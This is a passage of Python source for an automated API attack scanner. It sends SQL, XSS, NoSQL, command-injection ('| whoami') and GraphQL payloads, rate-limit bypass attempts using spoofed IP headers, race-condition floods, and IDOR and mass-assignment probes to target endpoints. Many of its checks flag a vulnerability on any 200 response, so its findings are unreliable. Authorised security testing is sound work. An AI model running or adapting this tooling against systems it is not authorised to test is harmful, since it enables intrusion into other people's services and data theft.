                            responses.append({
                                'status': response.status,
                                'time': response_time,
                                'timestamp': start_time
                            })
                        
                        # Check for rate limiting
                        if response.status == 429:
                            rate_limiting_test['detected'] = True
                            rate_limiting_test['threshold'] = i + 1
                            
                            # Test bypass techniques
                            bypass_techniques = await self._test_rate_limiting_bypass(url, method)
                            rate_limiting_test['bypass_techniques'] = bypass_techniques
                            
                            break
                        
                        await asyncio.sleep(0.1)  # Small delay
                        
                    except Exception as e:
                        logger.debug(f"Rate limiting test failed for request {i}: {e}")
                        continue
                
                if rate_limiting_test['detected']:
                    break
                    
        except Exception as e:
            logger.error(f"❌ Rate limiting test failed: {e}")
        
        return rate_limiting_test

    async def _test_rate_limiting_bypass(self, url: str, method: str) -> List[str]:
        """Test rate limiting bypass techniques"""
        bypass_techniques = []
        
        try:
            # Test IP rotation via headers
            ip_headers = [
                {'X-Forwarded-For': '1.1.1.1'},
                {'X-Real-IP': '2.2.2.2'},
                {'X-Client-IP': '3.3.3.3'},
                {'CF-Connecting-IP': '4.4.4.4'}
            ]
            
            for header in ip_headers:
                responses = []
                for i in range(10):
                    try:
                        async with self.session.request(method, url, headers=header) as response:
                            if response.status == 429:
                                break
                            responses.append(response.status)
                    except:
                        break
                
                if len(responses) >= 10:
                    bypass_techniques.append('ip_rotation')
                    break
            
            # Test user agent rotation
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            
            for ua in user_agents:
                responses = []
                for i in range(10):
                    try:
                        headers = {'User-Agent': ua}
                        async with self.session.request(method, url, headers=headers) as response:
                            if response.status == 429:
                                break
                            responses.append(response.status)
                    except:
                        break
                
                if len(responses) >= 10:
                    bypass_techniques.append('user_agent_rotation')
                    break
                    
        except Exception as e:
            logger.error(f"❌ Rate limiting bypass test failed: {e}")
        
        return bypass_techniques

    async def _analyze_input_validation_advanced(self, endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Advanced input validation analysis"""
        input_validation = {
            'validation_methods': {},
            'injection_vulnerabilities': [],
            'validation_bypasses': []
        }
        
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            methods = endpoint.get('methods', [])
            
            # Test input validation
            validation_test = await self._test_input_validation_advanced(url, methods)
            input_validation['validation_methods'][url] = validation_test['methods']
            input_validation['injection_vulnerabilities'].extend(validation_test['vulnerabilities'])
            input_validation['validation_bypasses'].extend(validation_test['bypasses'])
        
        return input_validation

    async def _test_input_validation_advanced(self, url: str, methods: List[str]) -> Dict[str, Any]:
        """Test input validation with advanced techniques"""
        validation_test = {
            'methods': [],
            'vulnerabilities': [],
            'bypasses': []
        }
        
        try:
            # Test different injection types
            injection_tests = {
                'sql_injection': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL--",
                    "'; WAITFOR DELAY '0:0:5'--"
                ],
                'xss': [
                    "<script>alert('XSS')</script>",
                    "javascript:alert('XSS')",
                    "<img src=x onerror=alert('XSS')>"
                ],
                'nosql_injection': [
                    {"$ne": ""},
                    {"$gt": ""},
                    {"$where": "function() { return true; }"}
                ],
                'command_injection': [
                    "; ls -la",
                    "| whoami",
                    "&& whoami"
                ]
            }
            
            for method in methods:
                for injection_type, payloads in injection_tests.items():
                    for payload in payloads:
                        try:
                            if method in ['POST', 'PUT', 'PATCH']:
                                async with self.session.request(method, url, json={'data': payload}) as response:
                                    if response.status == 200:
                                        validation_test['vulnerabilities'].append(f'{injection_type}_injection')
                                        validation_test['methods'].append('json_validation')
                            else:
                                # Add payload to URL
                                parsed_url = urlparse(url)
                                query_params = parse_qs(parsed_url.query)
                                query_params['test'] = [str(payload)]
                                
                                new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                                test_url = parsed_url._replace(query=new_query).geturl()
                                
                                async with self.session.request(method, test_url) as response:
                                    if response.status == 200:
                                        validation_test['vulnerabilities'].append(f'{injection_type}_injection')
                                        validation_test['methods'].append('query_validation')
                                        
                        except Exception as e:
                            logger.debug(f"Input validation test failed for {injection_type}: {e}")
                            continue
                            
        except Exception as e:
            logger.error(f"❌ Input validation test failed: {e}")
        
        return validation_test

    async def _analyze_business_logic_advanced(self, endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Advanced business logic analysis"""
        business_logic = {
            'vulnerabilities': [],
            'bypass_techniques': [],
            'manipulation_vectors': []
        }
        
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            methods = endpoint.get('methods', [])
            
            # Test business logic vulnerabilities
            logic_test = await self._test_business_logic_advanced(url, methods)
            business_logic['vulnerabilities'].extend(logic_test['vulnerabilities'])
            business_logic['bypass_techniques'].extend(logic_test['bypasses'])
            business_logic['manipulation_vectors'].extend(logic_test['manipulation_vectors'])
        
        return business_logic

    async def _test_business_logic_advanced(self, url: str, methods: List[str]) -> Dict[str, Any]:
        """Test business logic vulnerabilities"""
        logic_test = {
            'vulnerabilities': [],
            'bypasses': [],
            'manipulation_vectors': []
        }
        
        try:
            # Test price manipulation
            if 'price' in url.lower() or 'cost' in url.lower():
                price_tests = [
                    {'price': -100},
                    {'price': 0},
                    {'price': 0.01},
                    {'price': 999999999}
                ]
                
                for method in methods:
                    if method in ['POST', 'PUT', 'PATCH']:
                        for test_data in price_tests:
                            try:
                                async with self.session.request(method, url, json=test_data) as response:
                                    if response.status == 200:
                                        logic_test['vulnerabilities'].append('price_manipulation')
                                        logic_test['manipulation_vectors'].append('negative_price')
                                        break
                            except:
                                continue
            
            # Test quantity manipulation
            if 'quantity' in url.lower() or 'amount' in url.lower():
                quantity_tests = [
                    {'quantity': -1},
                    {'quantity': 0},
                    {'quantity': 999999999},
                    {'quantity': 1.5}
                ]
                
                for method in methods:
                    if method in ['POST', 'PUT', 'PATCH']:
                        for test_data in quantity_tests:
                            try:
                                async with self.session.request(method, url, json=test_data) as response:
                                    if response.status == 200:
                                        logic_test['vulnerabilities'].append('quantity_manipulation')
                                        logic_test['manipulation_vectors'].append('negative_quantity')
                                        break
                            except:
                                continue
            
            # Test race conditions
            race_test = await self._test_race_condition(url, methods)
            if race_test:
                logic_test['vulnerabilities'].append('race_condition')
                logic_test['bypasses'].append('concurrent_requests')
            
            # Test parameter pollution
            pollution_test = await self._test_parameter_pollution(url, methods)
            if pollution_test:
                logic_test['vulnerabilities'].append('parameter_pollution')
                logic_test['bypasses'].append('parameter_doubling')
            
        except Exception as e:
            logger.error(f"❌ Business logic test failed: {e}")
        
        return logic_test

    async def _test_race_condition(self, url: str, methods: List[str]) -> bool:
        """Test race condition vulnerabilities"""
        try:
            for method in methods:
                if method in ['POST', 'PUT', 'PATCH']:
                    # Send concurrent requests
                    tasks = []
                    test_data = {'action': 'test', 'amount': 100}
                    
                    for _ in range(10):
                        task = self.session.request(method, url, json=test_data)
                        tasks.append(task)
                    
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Check if any requests succeeded
                    success_count = sum(1 for r in responses if not isinstance(r, Exception))
                    if success_count > 1:
                        return True
                        
        except Exception as e:
            logger.error(f"❌ Race condition test failed: {e}")
        
        return False

    async def _test_parameter_pollution(self, url: str, methods: List[str]) -> bool:
        """Test parameter pollution vulnerabilities"""
        try:
            for method in methods:
                # Test parameter pollution
                test_data = {
                    'amount': 100,
                    'amount': 1,  # This should override the first amount
                    'price': 10,
                    'PRICE': 1   # Case variation
                }
                
                if method in ['POST', 'PUT', 'PATCH']:
                    async with self.session.request(method, url, json=test_data) as response:
                        if response.status == 200:
                            return True
                else:
                    # Add to query parameters
                    parsed_url = urlparse(url)
                    query_params = parse_qs(parsed_url.query)
                    query_params.update(test_data)
                    
                    new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()
                    
                    async with self.session.request(method, test_url) as response:
                        if response.status == 200:
                            return True
                            
        except Exception as e:
            logger.error(f"❌ Parameter pollution test failed: {e}")
        
        return False

    async def _advanced_api_vulnerability_testing(self, endpoints: List[Dict[str, Any]]) -> List[AdvancedAPIVulnerability]:
        """Advanced API vulnerability testing"""
        vulnerabilities = []
        
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            methods = endpoint.get('methods', [])
            
            # Test advanced API vulnerabilities
            endpoint_vulns = await self._test_endpoint_advanced_vulnerabilities(url, methods)
            vulnerabilities.extend(endpoint_vulns)
        
        return vulnerabilities

    async def _test_endpoint_advanced_vulnerabilities(self, url: str, methods: List[str]) -> List[AdvancedAPIVulnerability]:
        """Test endpoint for advanced vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test GraphQL vulnerabilities
            if '/graphql' in url.lower():
                graphql_vulns = await self._test_graphql_vulnerabilities(url)
                vulnerabilities.extend(graphql_vulns)
            
            # Test REST API vulnerabilities
            else:
                rest_vulns = await self._test_rest_vulnerabilities(url, methods)
                vulnerabilities.extend(rest_vulns)
            
            # Test NoSQL injection
            nosql_vulns = await self._test_nosql_injection(url, methods)
            vulnerabilities.extend(nosql_vulns)
            
            # Test IDOR vulnerabilities
            idor_vulns = await self._test_idor_vulnerabilities(url, methods)
            vulnerabilities.extend(idor_vulns)
            
            # Test mass assignment
            mass_assignment_vulns = await self._test_mass_assignment(url, methods)
            vulnerabilities.extend(mass_assignment_vulns)
            
        except Exception as e:
            logger.error(f"❌ Advanced vulnerability testing failed for {url}: {e}")
        
        return vulnerabilities

    async def _test_graphql_vulnerabilities(self, url: str) -> List[AdvancedAPIVulnerability]:
        """Test GraphQL vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test GraphQL introspection
            introspection_query = {
                'query': '{__schema{types{name}}}'
            }
            
            async with self.session.post(url, json=introspection_query) as response:
                if response.status == 200:
                    content = await response.text()
                    if '__schema' in content:
                        vulnerabilities.append(AdvancedAPIVulnerability(
                            vulnerability_type='graphql_introspection',
                            severity='medium',
                            description='GraphQL introspection enabled',
                            endpoint=url,
                            method='POST',
                            payload=json.dumps(introspection_query),
                            confidence_level='high'
                        ))
            
            # Test GraphQL injection
            injection_queries = [
                {'query': '{users{id,email,password}}'},
                {'query': '{users{id,email,password}filter:{id:"1 OR 1=1"}}'},
                {'query': '{__schema{queryType{fields{name args{name}}}}}'}
            ]
            
            for query in injection_queries:
                async with self.session.post(url, json=query) as response:
                    if response.status == 200:
                        content = await response.text()
                        if 'password' in content or 'users' in content:
                            vulnerabilities.append(AdvancedAPIVulnerability(
                                vulnerability_type='graphql_injection',
                                severity='high',
                                description='GraphQL injection vulnerability',
                                endpoint=url,
                                method='POST',
                                payload=json.dumps(query),
                                confidence_level='high'
                            ))
                            break
                        
        except Exception as e:
            logger.error(f"❌ GraphQL vulnerability test failed: {e}")
        
        return vulnerabilities

    async def _test_rest_vulnerabilities(self, url: str, methods: List[str]) -> List[AdvancedAPIVulnerability]:
        """Test REST API vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test SQL injection
            sql_payloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "' AND SLEEP(5)--",
                "' OR IF(1=1, SLEEP(5), 0)--"
            ]
            
            for method in methods:
                for payload in sql_payloads:
                    try:
                        if method in ['POST', 'PUT', 'PATCH']:
                            test_data = {'id': payload}
                            async with self.session.request(method, url, json=test_data) as response:
                                content = await response.text()
                                
                                # Check for SQL injection indicators
                                if any(indicator in content.lower() for indicator in ['sql syntax', 'mysql_fetch', 'error in your sql syntax']):
                                    vulnerabilities.append(AdvancedAPIVulnerability(
                                        vulnerability_type='sql_injection',
                                        severity='high',
                                        description='SQL injection in REST API',
                                        endpoint=url,
                                        method=method,
                                        payload=payload,
                                        confidence_level='high'
                                    ))
                                    break
                        else:
                            # Add to query parameters
                            parsed_url = urlparse(url)
                            query_params = parse_qs(parsed_url.query)
                            query_params['id'] = [payload]
                            
                            new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                            test_url = parsed_url._replace(query=new_query).geturl()
                            
                            async with self.session.request(method, test_url) as response:
                                content = await response.text()
                                
                                if any(indicator in content.lower() for indicator in ['sql syntax', 'mysql_fetch', 'error in your sql syntax']):
                                    vulnerabilities.append(AdvancedAPIVulnerability(
                                        vulnerability_type='sql_injection',
                                        severity='high',
                                        description='SQL injection in REST API',
                                        endpoint=test_url,
                                        method=method,
                                        payload=payload,
                                        confidence_level='high'
                                    ))
                                    break
                                    
                    except Exception as e:
                        logger.debug(f"SQL injection test failed: {e}")
                        continue
                        
        except Exception as e:
            logger.error(f"❌ REST vulnerability test failed: {e}")
        
        return vulnerabilities

    async def _test_nosql_injection(self, url: str, methods: List[str]) -> List[AdvancedAPIVulnerability]:
        """Test NoSQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test NoSQL injection payloads
            nosql_payloads = [
                {"$ne": ""},
                {"$gt": ""},
                {"$where": "function() { return true; }"},
                {"$in": [1, 2, 3]},
                {"$exists": True}
            ]
            
            for method in methods:
                for payload in nosql_payloads:
                    try:
                        if method in ['POST', 'PUT', 'PATCH']:
                            async with self.session.request(method, url, json=payload) as response:
                                if response.status == 200:
                                    vulnerabilities.append(AdvancedAPIVulnerability(
                                        vulnerability_type='nosql_injection',
                                        severity='high',
                                        description='NoSQL injection vulnerability',
                                        endpoint=url,
                                        method=method,
                                        payload=json.dumps(payload),
                                        confidence_level='high'
                                    ))
                                    break
                                    
                    except Exception as e:
                        logger.debug(f"NoSQL injection test failed: {e}")
                        continue
                        
        except Exception as e:
            logger.error(f"❌ NoSQL injection test failed: {e}")
        
        return vulnerabilities

    async def _test_idor_vulnerabilities(self, url: str, methods: List[str]) -> List[AdvancedAPIVulnerability]:
        """Test Insecure Direct Object Reference vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test IDOR by trying different IDs
            test_ids = [1, 2, 999999, 0, -1]
            
            for method in methods:
                for test_id in test_ids:
                    try:
                        if method in ['POST', 'PUT', 'PATCH']:
                            test_data = {'id': test_id}
                            async with self.session.request(method, url, json=test_data) as response:
                                if response.status == 200:
                                    vulnerabilities.append(AdvancedAPIVulnerability(
                                        vulnerability_type='idor',
                                        severity='high',
                                        description=f'Insecure Direct Object Reference (ID: {test_id})',
                                        endpoint=url,
                                        method=method,
                                        payload=json.dumps(test_data),
                                        confidence_level='medium'
                                    ))
                                    break
                        else:
                            # Add ID to query parameters
                            parsed_url = urlparse(url)
                            query_params = parse_qs(parsed_url.query)
                            query_params['id'] = [str(test_id)]
                            
                            new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                            test_url = parsed_url._replace(query=new_query).geturl()
                            
                            async with self.session.request(method, test_url) as response:
                                if response.status == 200:
                                    vulnerabilities.append(AdvancedAPIVulnerability(
                                        vulnerability_type='idor',
                                        severity='high',
                                        description=f'Insecure Direct Object Reference (ID: {test_id})',
                                        endpoint=test_url,
                                        method=method,
                                        payload=f'id={test_id}',
                                        confidence_level='medium'
                                    ))
                                    break
                                    
                    except Exception as e:
                        logger.debug(f"IDOR test failed: {e}")
                        continue
                        
        except Exception as e:
            logger.error(f"❌ IDOR test failed: {e}")
        
        return vulnerabilities

    async def _test_mass_assignment(self, url: str, methods: List[str]) -> List[AdvancedAPIVulnerability]:
        """Test mass assignment vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test mass assignment payloads
            mass_assignment_payloads = [
                {'user': {'name': 'test', 'admin': True}},
                {'user': {'name': 'test', 'role': 'admin'}},
                {'user': {'name': 'test', 'is_admin': True}},
                {'profile': {'name': 'test', 'admin': True}},
                {'data': {'name': 'test', 'admin': True}}
            ]
            
            for method in methods:
                if method in ['POST', 'PUT', 'PATCH']:
                    for payload in mass_assignment_payloads:
                        try:
                            async with self.session.request(method, url, json=payload) as response:
                                if response.status == 200:
                                    vulnerabilities.append(AdvancedAPIVulnerability(
                                        vulnerability_type='mass_assignment',
                                        severity='high',
                                        description='Mass assignment vulnerability',
                                        endpoint=url,
                                        method=method,
                                        payload=json.dumps(payload),
                                        confidence_level='high'
                                    ))
                                    break
                                    
                        except Exception as e:
                            logger.debug(f"Mass assignment test failed: {e}")
                            continue
                        
        except Exception as e:
            logger.error(f"❌ Mass assignment test failed: {e}")
        
        return vulnerabilities

# Import required modules at the top
import re
from urllib.parse import parse_qs